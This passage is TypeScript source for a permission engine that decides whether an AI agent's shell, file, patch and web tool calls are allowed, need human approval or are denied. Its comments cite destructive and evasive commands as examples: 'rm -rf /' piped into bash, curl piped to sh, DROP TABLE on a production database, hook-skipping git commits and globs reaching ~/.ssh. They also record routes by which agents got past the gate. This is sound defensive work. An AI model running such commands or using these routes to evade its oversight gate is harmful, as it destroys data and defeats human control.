    // preserved), so `env -S 'git commit -nm x'` is caught while `env -S 'git commit -m "fix -n"'` is not.
    if ([seg, ...carrierCommandValues(seg)].some((s) => commitBypassFlag(s)))
      hits.push({
        capability: 'git.hooks.bypass',
        verdict: verdictFor(table, ctx, 'git.hooks.bypass'),
        via: 'git commit hook-bypass flag',
        segment: seg,
        absolute: isAbsoluteCap(table, 'git.hooks.bypass'),
      });
    const effectiveCwd = cwd === '\0dynamic' ? state.env.cwd : cwd;
    // a declared name matters exactly where it is USED
    const segHead = (tokenize(seg)[0] ?? '').replace(/^.*\//, '');
    // A FUNCTION DEFINED HERE IS NOT AN UNRESOLVED BINDING. Its body was handed over at the definition, so EGO
    // knows exactly what the name means — reporting a binding gap for it made every script that defines a helper
    // and calls it ask, `usage` in a real hook among them (exit review 5). An alias keeps its gap: its body is
    // not handed over, so the name really is bound to something the analyzer never read.
    const bindingWhy = rebound ?? definedNames.get(segHead) ?? null;
    // the tracked working directory IS the resolution context; when `cd` went somewhere dynamic it is not proven,
    // and every conclusion drawn from a relative path below is downgraded rather than guessed
    const env: ExecutionEnvironment = {
      ...state.env,
      written,
      cwd: effectiveCwd,
      cwdVerified: cwd !== '\0dynamic',
      // ENVIRONMENT-INPUT CLOSURE: captured HERE, before normalizeSegment strips the assignments, so the producer
      // boundary sees what the command line did to the tool it is about to resolve
      envInputs: { ...state.env.envInputs, ...carriedEnv, ...segmentEnvInputs(seg) },
      definedNames: functionNames,
      rawSegment: seg,
      ...(bindingWhy !== null ? { binding: { kind: 'redefined' as const, why: bindingWhy } } : {}),
      get treeFresh(): boolean {
        return !written.has(TREE_DIRTY);
      },
    };
    // `git -C dir …` genuinely runs in `dir`, and normalization strips the option before any producer sees it.
    // The directory a command runs in belongs to the ENVIRONMENT, so it is recorded here rather than rediscovered
    // downstream from a string the normalizer has already rewritten (challenge 8, producer subject identity).
    // `-C` is a git GLOBAL option, which means before the verb. `git blame -C file` and `git diff -C` use the
    // same letter for "detect copies", and matching it anywhere downgraded every one of them to an unverified
    // context — ordinary review commands, asking for no reason.
    const envChdir = /(^|\s)env\s+(?:-\S+\s+)*?(?:-C\s+|--chdir[= ])(\S+)/.exec(seg.trim());
    if (envChdir) {
      const target = expandHome(envChdir[2]!);
      if (target !== null && !/[$`*?]/.test(target)) {
        env.cwd = isAbsolute(target) ? target : resolve(effectiveCwd, target);
        env.cwdVerified = env.cwdVerified && directoryExists(env.cwd) && repoRootFor(ctx, env.cwd) !== null;
      } else env.cwdVerified = false;
    }
    const gitDir = /^git\s+(?:-[cC]\s+\S+\s+|--[a-z-]+(?:=\S+)?\s+|-[a-z]\s+\S+\s+)*?(?:-C\s+|--work-tree[= ])(\S+)/.exec(
      seg.trim(),
    );
    if (gitDir) {
      const target = expandHome(gitDir[1]!);
      if (target !== null && !/[$`*?]/.test(target)) {
        env.cwd = isAbsolute(target) ? target : resolve(effectiveCwd, target);
        env.cwdVerified = env.cwdVerified && directoryExists(env.cwd);
      } else env.cwdVerified = false;
    }
    const carried = execCarriedCommand(seg);
    if (carried !== null)
      for (const h of analyzeSegments(table, ctx, compiled, [carried], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (carried by exec)`.trim() });
    // A PIPELINE INSIDE A CARRIER IS STILL A PIPELINE, and the normalizer cannot carry the edge across: it returns
    // strings. The body re-enters the canonical analyzer whole, which is the only place the edge can be seen.
    // An awk program's shell commands have no other route in, so they are always handed over. Read from the RAW
    // segment: the program is ONE quoted word, and the normalizer has already dropped the quotes that say so.
    for (const body of awkShellCommands(seg))
      for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (run by awk)`.trim() });
    for (const body of carriedShellBodies(seg))
      // A CARRIED BODY IS A UNIT OF SHELL, and the state that flows between its commands flows there too. Only a
      // body containing a PIPE re-entered the analyzer; one containing `&&`, `;` or a newline was flattened into
      // sibling units of the OUTER segment, where the per-unit state — the working directory and the environment
      // — is the outer one. So `bash -c "export PGHOST=prod-db… && psql -c 'DROP TABLE users'"` lost the
      // assignment that the same text without the carrier carries perfectly well (exit review 7, cross-product).
      // A SINGLE-command body needs no re-entry: the normalizer reaches it on its own.
      if (splitShellPipeline(body).length > 1)
        for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
          hits.push({ ...h, via: `${h.via ?? ''} (carried by a shell carrier)`.trim() });
    // A PIPE INTO AN INTERPRETER IS AN EXECUTION EDGE. `echo 'rm -rf /' | bash` runs the first stage's output as
    // the second stage's SCRIPT; with the `|` discarded the two looked unrelated and an absolute core deny asked
    // instead of being denied (exit review 4). When the upstream is a LITERAL, the text that will run is known and
    // is analysed as what it is; when it is not — `curl … | sh`, `cat f | sh` — something WILL run that was never
    // read, which is opacity and never ALLOW.
    // `bash <(echo 'rm -rf /')` hands the interpreter a FILE holding that command's output, and running it is the
    // same execution edge a pipe is — the operand is just spelled differently (exit review 5).
    const procSubScript =
      stage.fromProcessSubstitution === true &&
      /\$SUBST/.test(seg) &&
      RUNS_A_FILE_RE.test((tokenize(seg)[0] ?? '').replace(/^.*\//, ''))
        ? upstream
        : null;
    const stdinSource = stdinFrom ?? procSubScript;
    if (stdinSource !== null && (procSubScript !== null || normalizeSegment(seg).some(readsScriptFromStdin))) {
      const stdinFromResolved = stdinSource;
      // every command of the upstream group contributes its own literal line; if any of them is not readable the
      // whole standard output is not known, which is opacity rather than a partial script
      const parts = stdinParts.length > 1 && stdinFrom !== null ? stdinParts : [stdinFromResolved];
      // EACH COMMAND'S STANDARD OUTPUT CARRIES THE NEWLINE ITS EMITTER WRITES. `echo` appends one and `printf`
      // does not, so joining a group's parts with a newline split `{ printf 'git '; printf 'push origin main\n'; }`
      // into two unrelated words instead of the one command it really produces (exit review 8).
      const outs = parts.map((pt, k) => {
        const lit = literalStdout(pt, k === parts.length - 1 ? (upstreamHeredoc ?? undefined) : undefined);
        if (lit === null || parts.length === 1) return lit;
        return /^(?:\S*\/)?echo\b/.test(pt.trim()) && !/^(?:\S*\/)?echo\s+-[a-zA-Z]*n/.test(pt.trim())
          ? lit + '\n'
          : lit;
      });
      const literal = outs.some((o) => o === null) ? null : outs.join('');
      if (literal !== null)
        for (const h of analyzeSegments(table, ctx, compiled, [literal], { ...state, env }, true))
          hits.push({ ...h, via: `${h.via ?? ''} (carried through a pipe)`.trim() });
      else
        hits.push(
          opaqueHit(table, ctx, seg, `runs the standard output of \`${stdinFromResolved}\`, which this kernel did not read`),
        );
    }
    // A CALL TO A FUNCTION DEFINED HERE runs the body that was already handed over at the definition, so the call
    // itself adds nothing — but its REDIRECTIONS and path operands are still its own, which is why the head is
    // marked rather than the segment skipped (exit review 5).
    // A LOCAL FUNCTION SHADOWS A BARE NAME, NEVER A PATH. `git() { true; }; /usr/bin/git push origin main` runs
    // the real program: the shell looks a function up by NAME, and a command with a slash in it is a path
    // (exit review 8). `segHead` has had its directory stripped, so the RAW head is what decides.
    const rawHead0 = tokenize(seg)[0] ?? '';
    const classifySeg =
      functionNames.has(segHead) && !rawHead0.includes('/') ? `${MARK}local-function ${seg}` : seg;
    for (const norm of normalizeSegment(classifySeg)) {
      const normHits = classifyNormalized(table, ctx, compiled, norm, { ...state, env });
      for (const h of normHits) hits.push(h);
      // a locked operation carried by any wrapper, launcher or placeholder the normalizer does not know is still found:
      // every suffix of the token list that starts with a governed tool is matched against the locked matchers
      if (!normHits.some((h) => h.verdict === 'DENY')) {
        const marked = tokenizeMarked(seg);
        for (let k = 1; k < marked.length; k++) {
          if (marked[k]!.quoted) continue; // a verb inside quotes is data
          const name = marked[k]!.text.slice(marked[k]!.text.lastIndexOf('/') + 1);
          if (!LOCKED_HEADS.has(name)) continue;
          const suffix = [name, ...marked.slice(k + 1).map((t) => t.text)].join(' ');
          for (const sub of normalizeSegment(suffix)) {
            for (const { m, re } of compiled) {
              if (!re.test(sub)) continue;
              const lock = table.capabilities[m.capability]?.lock;
              if (
                lock === 'absolute' ||
                lock === 'organization' ||
                m.capability === 'command.env-inject' ||
                m.capability === 'ego.gate.bypass'
              )
                // the sweep rebuilds the suffix from the governed head, which DROPS a leading assignment — so
                // `AWS_ENDPOINT_URL=… aws s3 rm …` lost its endpoint here and was re-denied behind the resolver's
                // back. The rebuilt suffix is judged against the same environment the segment carries.
                hits.push(
                  retargetLocalCapability(
                    table,
                    ctx,
                    {
                      capability: m.capability,
                      verdict: verdictFor(table, ctx, m.capability),
                      via: `locked operation carried in argument position: ${sub}`,
                      segment: norm,
                      absolute: isAbsoluteCap(table, m.capability),
                    },
                    sub,
                    env.envInputs,
                  ),
                );
              break;
            }
          }
        }
      }
      // path arguments of the normalized command (after wrappers and global flags are stripped)
      // A SEARCH PATTERN IS DATA. Normalization de-quotes, so `grep 'rm -rf /' notes.md` reaches the path scan as
      // three tokens and `/` was read as a search ROOT — an ordinary code search denied as a recursive read of the
      // filesystem (exit review 5). The pattern's words are taken from the RAW segment, where it is still one word.
      const rawMarked = tokenizeMarked(seg);
      const rawHead = (rawMarked[0]?.text ?? '').replace(/^.*\//, '');
      const patternWords =
        PATTERN_FIRST_HEADS.has(rawHead) &&
        !rawMarked.some((t) => /^-[a-zA-Z]*[ef]$/.test(t.text) || /^--(regexp|file)=/.test(t.text))
          ? (rawMarked.find((t, i) => i > 0 && !t.text.startsWith('-'))?.text ?? '').split(/\s+/).filter(Boolean)
          : [];
      // A CONTAINER'S PATHS ARE THE IMAGE'S. A Dockerfile RUN line writes inside the image, not on the host, so
      // its path operands are not judged against the workspace; its COMMANDS still are, and so is anything the
      // analyzer could not READ, which is unreadable wherever it runs (exit review 8).
      for (const h of classifyShellPaths(
        table,
        ctx,
        norm,
        effectiveCwd,
        patternWords,
        env.containerPaths === true,
        written,
      ))
        hits.push(h);
    }
    // shell writes whose target token resolves under the EGO home trust stores are trust tampering wherever EGO_HOME is
    if (ctx.egoHome) {
      const head = tokenize(seg)[0] ?? '';
      if (WRITE_HEADS.has(head) || WRITE_HEADS.has(head.slice(head.lastIndexOf('/') + 1))) {
        for (const tok of tokenize(seg).slice(1)) {
          if (!tok.includes('/') || /^-/.test(tok)) continue;
          const abs = canonicalPath(tok.replace(/^~(?=\/|$)/, homedir()));
          const home = canonicalPath(ctx.egoHome).split(sep).join('/');
          if (underTrustDir(abs.split(sep).join('/'), home)) {
            hits.push({
              capability: 'ego.trust.tamper',
              verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
              via: 'EGO_HOME trust store (shell write)',
              segment: seg,
              absolute: true,
            });
          }
        }
      }
    }
    // a shell redirection is a path-known write: classify its target like a Write tool call
    for (const target of redirectionTargets(seg)) {
      const expanded = expandHome(target);
      if (expanded === null || /[$`*?]/.test(expanded)) {
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: 'redirection to a dynamic path',
          segment: seg,
          absolute: false,
        });
        continue;
      }
      const abs = isAbsolute(expanded) ? expanded : resolve(effectiveCwd, expanded);
      written.add(canonicalPath(abs)); // A4: a later unit resolving THIS file is now stale
      const h = classifyPath(table, ctx, 'Write', abs);
      hits.push({ ...h, via: `redirection > ${target} (${h.via})`, segment: seg });
    }
    // and the write-ish commands, whose destination is an operand rather than a redirection
    for (const abs of writtenPathOperands(seg, effectiveCwd)) written.add(canonicalPath(abs));
    // an extraction or a recursive copy writes a set of files nobody enumerated, so nothing resolved after it in
    // this unit is provably fresh — the same wildcard the ledger already uses for an undetermined effect
    if (writesUnenumerably(seg)) written.add('\0any');
    // a standalone assignment (`PATH=./bin:$PATH`, `export SHELL=…`) sets it for every LATER segment of this
    // shell, and a function or alias definition rebinds the name it declares
    // THE ASSIGNMENT IS FOUND WHERE THE COMMAND STARTS, not where the segment does. A shell keyword in front of
    // it — `if export PGHOST=prod-db… && psql …`, `do export …` — left the test looking at `if export PGHOST=…`,
    // so the variable never carried to the next segment and a production database was read as the local socket
    // (exit review 7, generated cross-product). Same statement as the normalizer's own prefix loop.
    let bare = seg.trim();
    for (;;) {
      const kw = /^(\S+)\s+/.exec(bare);
      if (kw && (PREFIX_KEYWORDS.has(kw[1]!) || /^(export|declare|typeset|local|readonly)$/.test(kw[1]!))) {
        bare = bare.slice(kw[0].length).trim();
        // `declare -x NAME=value` is `export NAME=value`: the builtin's own options come first
        bare = bare.replace(/^(-[a-zA-Z]+\s+)+/, '');
        continue;
      }
      break;
    }
    if (/^[A-Za-z_][A-Za-z0-9_]*=\S*\s*$/.test(bare)) Object.assign(carriedEnv, segmentEnvInputs(bare + ' x'));
    const decl = /^(?:alias\s+([A-Za-z_][\w.-]*)=|(?:function\s+)?([A-Za-z_][\w.-]*)\s*\(\s*\)\s*\{)/.exec(seg.trim());
    if (decl && bindingIsProven) definedNames.set(decl[1] ?? decl[2]!, `the body defines ${decl[1] ?? decl[2]} before using it`);
    // TREE-STATE PROVENANCE: a checkout, reset, stash pop, merge, rebase or worktree switch replaces a
    // repository-determined, unenumerable set of files. The per-path ledger cannot express that, so the tree
    // itself stops being fresh and every later conclusion drawn from repository content is STALE.
    // tested against the NORMALIZED forms, not the raw text: `git -C dir checkout` and `git --git-dir=… checkout`
    // normalize to `git checkout`, and a regex over the raw segment missed every option that takes an argument
    if (normalizeSegment(seg).some((n) => TREE_CHANGING.test(n.trim()))) written.add(TREE_DIRTY);
    // A4 — a segment whose own effect could not be determined may have written ANY file, so nothing resolved after
    // it in this unit is provably fresh. This is what makes freshness a property rather than a list of writers.
    if (
      hits
        .slice(hitsBefore)
        .some(
          (h) =>
            OPACITY_CLASSES.has(h.capability) ||
            h.capability === 'command.ambient-unresolved' ||
            h.capability === 'command.interpreter-inline',
        )
    )
      written.add('\0any');
    // A PASS-THROUGH COPIES ITS INPUT TO ITS OUTPUT, so the literal survives it: `echo 'rm -rf /' | cat | bash`
    // runs the rm, and one identity stage was enough to defeat the edge entirely (exit review 5).
    if (!(stdinFrom !== null && PASS_THROUGH_RE.test(seg.trim()))) {
      // this stage's standard output is what a following piped stage would read — and when this stage is part of
      // a GROUP, so is every earlier stage of the same group
      if (stage.groupId !== undefined && stage.groupId === upstreamGroup) upstreamParts.push(seg);
      else {
        upstreamParts = [seg];
        upstreamGroup = stage.groupId;
      }
      upstream = upstreamParts.join('\n');
      upstreamBody =
        stage.heredocBody === undefined ? null : { body: stage.heredocBody, expanded: stage.heredocExpanded === true };
    }
  }
    }
  return hits;
}

export function classifyCommand(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  command: string,
): CapabilityHit[] {
  const bashMatchers = table.matchers.filter((m) => m.command && (m.tool === 'Bash' || m.tool === 'any'));
  const compiled: Array<{ m: CompiledMatcher; re: RegExp }> = bashMatchers.map((m) => ({
    m,
    re: new RegExp(m.command!, 'i'),
  }));
  // A3 — CONTEXT VERIFICATION MUST BE EARNED. `cwdVerified` used to default to true merely because a cwd string
  // existed, so every conclusion drawn from a relative path inherited a claim nobody had checked. The invocation
  // directory counts as proven only when it EXISTS and lies inside a registered repository root — the two facts
  // every relative resolution below actually depends on.
  const cwd = ctx.cwd ?? process.cwd();
  const cwdVerified = directoryExists(cwd) && repoRootFor(ctx, cwd) !== null;
  return analyzeSegments(table, ctx, compiled, [command], {
    depth: 0,
    seen: new Set(),
    env: baseEnvironment(cwd, cwdVerified),
  });
}

export function classifyUrl(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  url: string,
): CapabilityHit {
  let host = url;
  try {
    host = new URL(url).host;
  } catch {
    /* keep raw */
  }
  for (const m of table.matchers) {
    if (!m.url || (m.tool !== 'WebFetch' && m.tool !== 'any')) continue;
    if (new RegExp(m.url, 'i').test(host)) {
      return {
        capability: m.capability,
        verdict: verdictFor(table, ctx, m.capability),
        via: `matcher url /${m.url}/`,
        absolute: isAbsoluteCap(table, m.capability),
      };
    }
  }
  return {
    capability: 'network.unknown',
    verdict: verdictFor(table, ctx, 'network.unknown'),
    via: 'no url matcher',
    absolute: false,
  };
}

function applyGrants(hit: CapabilityHit, ctx: EvaluationContext): CapabilityHit {
  if (hit.verdict === 'ASK' && !hit.absolute && ctx.grants?.includes(hit.capability)) {
    return { ...hit, verdict: 'ALLOW', grantApplied: true };
  }
  return hit;
}

export function evaluate(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  req: ToolRequest,
): Evaluation {
  let hits: CapabilityHit[] = [];
  const tool = req.tool;
  if (tool === 'Bash' || tool === 'shell') {
    const command = typeof req.input['command'] === 'string' ? req.input['command'] : '';
    hits = classifyCommand(table, ctx, command);
  } else if (tool === 'Read') {
    const p = typeof req.input['file_path'] === 'string' ? req.input['file_path'] : '';
    if (p) hits = [classifyPath(table, ctx, 'Read', p)];
  } else if (tool === 'Grep' || tool === 'Glob' || tool === 'LS') {
    // search tools read file contents or names under a path: the path (default: the working directory) is a read, and a
    // pattern that names a credential store is judged like one
    const base =
      typeof req.input['path'] === 'string' && req.input['path']
        ? req.input['path']
        : (ctx.cwd ?? process.cwd());
    const expanded = expandHome(base) ?? base;
    hits = [classifyPath(table, ctx, 'Read', expanded)];
    const home = canonicalPath(homedir()).split(sep).join('/');
    const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(ctx.cwd ?? process.cwd(), expanded))
      .split(sep)
      .join('/');
    const pattern = typeof req.input['pattern'] === 'string' ? req.input['pattern'] : '';
    const glob = typeof req.input['glob'] === 'string' ? req.input['glob'] : '';
    // THE PATTERN DECIDES THE REACH, so the pattern is CANONICALISED and classified like any other path — the
    // same thing `pathTokens` already does for the shell side. Concatenating `abs + '/' + pattern` and testing
    // the raw string meant an absolute pattern (`/Users/me/.ssh/*`), a `../` pattern or a `~/` pattern could
    // never match the home prefix, so the guard was inert on the one operand it was written for: `Glob` with
    // `path: ~/.ssh` was DENY and `Glob` with `pattern: ~/.ssh/*` — the byte-identical reach — was ALLOW.
    const reach = tool === 'Glob' ? pattern : glob;
    if (reach) {
      // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
      // written as `~/.ssh/**` does not match a string that still ends in a slash
      const cut = reach.search(/[*?[{]/);
      const rawLiteral = cut < 0 ? reach : reach.slice(0, cut);
      // `/**/…` has the literal prefix `/`; stripping its trailing slash collapsed it to `.` — the working
      // directory — so a pattern that reaches the whole filesystem read as an in-workspace search (exit review 2)
      const literal = rawLiteral === '/' ? '/' : rawLiteral.replace(/\/+$/, '') || '.';
      const home2 = expandHome(literal);
      const resolvedReach = canonicalPath(
        home2 !== null && isAbsolute(home2) ? home2 : resolve(abs, home2 ?? literal),
      );
      // a wildcard reads INSIDE the literal prefix, so the thing classified is the directory's CONTENTS: a path
      // matcher written as `~/.ssh/**` describes what is in it, not the directory entry itself
      // a pattern anchored at `/` or carrying a `..` segment is not bounded by its literal prefix: `/**/.ssh/*`
      // has the prefix `/` and reaches everything under it (exit review 2)
      // a `..` segment ANYWHERE in the pattern escapes the literal prefix wherever that prefix resolves, and a
      // root anchor is unbounded when the prefix is outside every registered root
      const unbounded =
        /(^|\/)\.\.(\/|$)/.test(reach) || (reach.startsWith('/') && repoRootFor(ctx, resolvedReach) === null);
      // classify what the prefix names FIRST: an unbounded reach must never REPLACE a stronger answer, and
      // `<home>/.ssh/*` is both unbounded and a credential store
      const byPath = classifyPath(table, ctx, 'Read', cut < 0 ? resolvedReach : resolvedReach + '/');
      const strongerThanOutside =
        byPath.via.startsWith('matcher path') || !byPath.capability.startsWith('fs.repo');
      const r =
        unbounded && !strongerThanOutside
          ? {
              capability: 'fs.outside-workspace.read',
              verdict: verdictFor(table, ctx, 'fs.outside-workspace.read'),
              via: 'the pattern is not bounded by a directory inside the workspace',
              absolute: false,
            }
          : byPath;
      // a reach that leaves every registered root is not the `fs.repo.read` the base claimed it was
      if (unbounded || r.via.startsWith('matcher path') || !r.capability.startsWith('fs.repo'))
        hits.push({ ...r, via: `${tool} pattern ${reach} (${r.via})` });
    }
    if (
      abs === home ||
      home.startsWith(abs + '/') ||
      abs === '/' ||
      globCouldReachCredentials(abs + '/' + reach)
    )
      hits.push({
        capability: 'fs.credential-store.read',
        verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
        via: `${tool} over ${base} can reach credential stores`,
        absolute: false,
      });
  } else if (tool === 'Write' || tool === 'Edit' || tool === 'MultiEdit' || tool === 'NotebookEdit') {
    const p =
      typeof req.input['file_path'] === 'string'
        ? req.input['file_path']
        : typeof req.input['notebook_path'] === 'string'
          ? req.input['notebook_path']
          : '';
    if (p) hits = [classifyPath(table, ctx, tool === 'Write' ? 'Write' : 'Edit', p)];
  } else if (tool === 'apply_patch') {
    const patch =
      typeof req.input['command'] === 'string'
        ? req.input['command']
        : typeof req.input['patch'] === 'string'
          ? req.input['patch']
          : '';
    // `*** Move to:` names the DESTINATION of a rename and was never classified: an unconditional, fully
    // attacker-controlled write to any path, at ALLOW (challenge finding 7)
    const paths = [...patch.matchAll(/^\*\*\* (?:(?:Update|Add|Delete) File|Move to): (.+)$/gm)].map((m) =>
      m[1]!.trim(),
    );
    if (paths.length === 0) {
      return {
        verdict: 'DENY',
        hits: [],
        reason: 'apply_patch with no parseable file headers is denied (paths must be known before execution)',
      };
    }
    hits = paths.map((p) => classifyPath(table, ctx, 'Write', p));
  } else if (tool === 'WebFetch' || tool === 'WebSearch') {
    const url = typeof req.input['url'] === 'string' ? req.input['url'] : '';
    if (url) hits = [classifyUrl(table, ctx, url)];
    else {
      // A search carries no url, but it is still public network egress. It reached ALLOW even in HIGH_ASSURANCE,
      // where `network.public-read` is DENY and egress control is a required containment control (challenge
      // finding 9). A search restricted to local domains is localhost traffic.
      const domains = Array.isArray(req.input['allowed_domains'])
        ? (req.input['allowed_domains'] as unknown[]).map(String)
        : [];
      const local = domains.length > 0 && domains.every((dm) => /^(localhost|127\.|::1|\[::1\])/i.test(dm));
      const capability = local ? 'network.localhost' : 'network.public-read';
      hits = [
        {
          capability,
          verdict: verdictFor(table, ctx, capability),
          via: domains.length
            ? `web search limited to ${domains.join(', ')}`
            : 'web search over the public internet',
          absolute: false,
        },
      ];
    }
  } else if (tool.startsWith('mcp__')) {
    // MCP: resolved by the trust file by the caller (mcp.ts); here only the unknown default applies
    hits = [
      {
        capability: 'mcp.unknown',
        verdict: verdictFor(table, ctx, 'mcp.unknown'),
        via: 'mcp trust not resolved',
        absolute: false,
      },
    ];
  }
  hits = hits.map((h) => applyGrants(h, ctx));
  if (hits.length === 0) {
    // NOTHING fell through to ALLOW any more. A tool the evaluator does not model, or a modelled tool whose
    // operand is missing or of an unexpected shape, is unknown capability — and on claude-code an `allow` is
    // rendered as `permissionDecision: "allow"`, which SUPPRESSES the host's own prompt. Returning ALLOW there was
    // strictly worse than saying nothing (challenge findings 8 and 13). `command.unknown` is ASK and its
    // description is "the host's own permission prompt decides".
    return {
      verdict: verdictFor(table, ctx, 'command.unknown'),
      hits,
      reason: `no governed operation could be resolved for tool "${tool}" (unmodelled tool, or a missing or unexpected operand); the host's own permission prompt decides`,
    };
  }
  const weight = (h: CapabilityHit) =>
    VERDICT_RANK[h.verdict] * 10 +
    (h.absolute ? 2 : table.capabilities[h.capability]?.lock === 'organization' ? 1 : 0);
  const decisive = hits.reduce((a, b) => (weight(b) > weight(a) ? b : a));
  const reason =
    decisive.verdict === 'DENY'
      ? `${decisive.capability} is DENY${decisive.absolute ? ' (absolute core deny)' : table.capabilities[decisive.capability]?.lock === 'organization' ? ' (organization-locked deny)' : ''} in profile ${ctx.profile}, mode ${ctx.mode} (${decisive.via}${decisive.segment ? `: ${decisive.segment}` : ''}${decisive.effectOf ? `; effect of ${decisive.effectOf}` : ''})`
      : decisive.verdict === 'ASK'
        ? `${decisive.capability} requires human approval in profile ${ctx.profile}, mode ${ctx.mode} (${decisive.via}${decisive.segment ? `: ${decisive.segment}` : ''}${decisive.effectOf ? `; effect of ${decisive.effectOf}` : ''})`
        : `allowed: ${hits.map((h) => h.capability + (h.grantApplied ? ' (granted)' : '')).join(', ')}`;
  return { verdict: decisive.verdict, hits, reason, decisive };
}
